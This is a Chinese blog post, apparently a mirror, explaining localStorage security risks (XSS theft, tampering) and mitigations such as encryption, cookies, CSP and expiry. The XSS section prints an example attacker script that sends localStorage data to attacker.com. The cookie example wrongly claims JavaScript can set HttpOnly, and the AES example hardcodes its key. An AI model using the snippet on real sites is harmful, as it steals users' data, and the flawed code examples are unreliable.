---
layout: post
title: "localstorage安全问题"
date: 2025-03-16 18:22:17 +0800
description: "使用 localStorage 来缓存数据时，确实存在一定的安全风险，尤其是当你缓存了敏感数据（如用户认证信息、支付信息等）时，可能会导致数据泄露或被篡改。示例：如果应用依赖 localStorage 中的某些数据进行用户认证，恶意用户可以手动修改 localStorage，伪造身份。问题：localStorage 是客户端存储，用户可以通过浏览器开发者工具修改其中的数据，导致数据被篡改。加密数据：对于存储在 localStorage 中的数据，进行加密并确保加密密钥不存储在客户端。"
keywords: "localstorage安全问题"
categories: ['笔记']
tags: ['前端']
artid: "146298827"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146298827
    alt: "localstorage安全问题"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146298827
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146298827
cover: https://bing.ee123.net/img/rand?artid=146298827
image: https://bing.ee123.net/img/rand?artid=146298827
img: https://bing.ee123.net/img/rand?artid=146298827
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     localstorage安全问题
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
     使用 localStorage 来缓存数据时，确实存在一定的安全风险，尤其是当你缓存了敏感数据（如用户认证信息、支付信息等）时，可能会导致数据泄露或被篡改。以下是常见的安全问题以及如何通过技术手段来提高安全性：
    </p>
    <hr/>
    <ol>
     <li>
      localStorage 安全问题
     </li>
    </ol>
    <p>
     （1）XSS 攻击（跨站脚本攻击）
    </p>
    <p>
     问题：如果页面存在 XSS 漏洞，攻击者可以在浏览器中注入恶意脚本，窃取 localStorage 中的数据。
    </p>
    <p>
     示例：攻击者通过插入恶意脚本获取并发送 localStorage 数据。
    </p>
    <p>
     // 攻击者脚本示例
     <br/>
     const userData = localStorage.getItem(‘user_info’);
     <br/>
     fetch(‘https://attacker.com/stealData’, { method: ‘POST’, body: userData });
    </p>
    <p>
     （2）数据篡改
    </p>
    <p>
     问题：localStorage 是客户端存储，用户可以通过浏览器开发者工具修改其中的数据，导致数据被篡改。
    </p>
    <p>
     示例：如果应用依赖 localStorage 中的某些数据进行用户认证，恶意用户可以手动修改 localStorage，伪造身份。
    </p>
    <hr/>
    <ol start="2">
     <li>
      如何提高 localStorage 安全性？
     </li>
    </ol>
    <p>
     （1）避免存储敏感数据
    </p>
    <p>
     尽量不要将敏感数据（如用户密码、身份验证信息、支付信息等）存储在 localStorage 中。如果必须存储敏感数据，可以考虑加密这些数据，并确保加密密钥不存储在客户端。
    </p>
    <p>
     方案：加密存储数据
    </p>
    <p>
     可以使用 对称加密算法（如 AES）对存储在 localStorage 中的数据进行加密。
    </p>
    <p>
     // 使用 CryptoJS 进行 AES 加密和解密
     <br/>
     const CryptoJS = require(“crypto-js”);
    </p>
    <p>
     // 加密数据
     <br/>
     const encryptedData = CryptoJS.AES.encrypt(‘sensitiveData’, ‘encryptionKey’).toString();
     <br/>
     localStorage.setItem(‘secureData’, encryptedData);
    </p>
    <p>
     // 解密数据
     <br/>
     const bytes = CryptoJS.AES.decrypt(localStorage.getItem(‘secureData’), ‘encryptionKey’);
     <br/>
     const decryptedData = bytes.toString(CryptoJS.enc.Utf8);
    </p>
    <p>
     注意：加密密钥不能存储在 localStorage 中，否则加密无效。
    </p>
    <hr/>
    <p>
     （2）使用 HTTPOnly 和 Secure Cookie
    </p>
    <p>
     对于敏感数据，优先考虑使用 Cookie 而不是 localStorage，并设置 HttpOnly 和 Secure 标志，防止 JavaScript 访问和中间人攻击。
    </p>
    <p>
     HttpOnly：只能通过服务器与客户端进行通信，无法通过 JavaScript 获取。
    </p>
    <p>
     Secure：仅通过 HTTPS 传输。
    </p>
    <p>
     // 设置一个 Secure 和 HttpOnly 的 Cookie
     <br/>
     document.cookie = “sessionId=12345; Secure; HttpOnly; SameSite=Strict”;
    </p>
    <p>
     优点：相比 localStorage，Cookie 会更安全，尤其是在存储会话信息时。
    </p>
    <hr/>
    <p>
     （3）避免 XSS 攻击
    </p>
    <p>
     要保护 localStorage 中的数据，防止 XSS 攻击，应用应当：
    </p>
    <p>
     严谨的输入验证：对用户输入进行严格的验证和清洗，避免恶意脚本执行。
    </p>
    <p>
     内容安全策略（CSP）：通过设置 CSP，限制外部脚本的执行，阻止恶意脚本的注入。
    </p>
    <p>
     框架内置防护：使用现代框架（如 React、Vue）时，框架通常会自动处理 XSS 风险，通过转义用户输入来防止脚本注入。
    </p>
    <hr/>
    <p>
     （4）定期清理 localStorage
    </p>
    <p>
     定期清理 localStorage 中的缓存数据，减少长期缓存敏感信息的风险。例如，在用户登出时清除所有缓存数据。
    </p>
    <p>
     localStorage.clear(); // 清空所有缓存
     <br/>
     localStorage.removeItem(‘secureData’); // 移除指定项
    </p>
    <hr/>
    <p>
     （5）限制数据存储的生命周期
    </p>
    <p>
     为了减少缓存时间，可以在存储时加上有效期标志，超期后自动清除。
    </p>
    <p>
     // 存储时记录时间戳
     <br/>
     localStorage.setItem(‘data’, JSON.stringify({ value: ‘someData’, timestamp: Date.now() }));
    </p>
    <p>
     // 使用时检查有效期
     <br/>
     const data = JSON.parse(localStorage.getItem(‘data’));
     <br/>
     if (data &amp;&amp; Date.now() - data.timestamp &gt; 3600000) { // 超过1小时
     <br/>
     localStorage.removeItem(‘data’);
     <br/>
     }
    </p>
    <p>
     这样可以控制数据的生命周期，防止数据长期存储导致的安全隐患。
    </p>
    <hr/>
    <ol start="3">
     <li>
      <p>
       总结：使用 localStorage 时的安全最佳实践
      </p>
     </li>
     <li>
      <p>
       避免存储敏感信息：不要将敏感信息（如密码、身份验证令牌）存储在 localStorage 中。
      </p>
     </li>
     <li>
      <p>
       加密数据：对于存储在 localStorage 中的数据，进行加密并确保加密密钥不存储在客户端。
      </p>
     </li>
     <li>
      <p>
       使用 HttpOnly 和 Secure Cookie：对于需要存储敏感信息的场景，优先使用 Cookie（带有 HttpOnly 和 Secure 标志）。
      </p>
     </li>
     <li>
      <p>
       防止 XSS 攻击：应用程序应当做好输入验证，使用 CSP 和框架内置的防护措施。
      </p>
     </li>
     <li>
      <p>
       定期清理缓存：定期清理 localStorage 中的缓存，尤其是在用户登出时。
      </p>
     </li>
     <li>
      <p>
       限制数据存储的生命周期：可以通过存储有效期标志来自动清除过期数据。
      </p>
     </li>
    </ol>
    <p>
     通过采取这些措施，可以有效提高 localStorage 的安全性，降低因恶意攻击或数据泄露带来的风险。
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f77656978696e5f34353832353931372f:61727469636c652f64657461696c732f313436323938383237" class_="artid" style="display:none">
 </p>
</div>


